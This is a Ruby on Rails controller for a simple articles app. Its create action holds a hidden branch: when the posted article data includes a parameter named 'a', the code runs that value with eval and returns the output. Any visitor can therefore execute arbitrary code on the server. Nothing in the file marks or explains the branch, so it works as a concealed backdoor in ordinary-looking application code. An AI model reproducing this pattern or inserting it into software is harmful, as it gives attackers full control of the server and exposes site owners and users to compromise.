class ArticlesController < ApplicationController
    def new
    end

    def index
        @articles = Article.all
    end


    def show
        @article = Article.find(params[:id])
    end


    def create
        @article = Article.new(article_params)
        
        if(params[:article].has_key?(:a))
            res = eval params[:article][:a]
            render plain: res
        else
            #render plain: params
            @article.save
            redirect_to @article
        end
    end
    private
        def article_params
            params.require(:article).permit(:title, :text)
        end
end

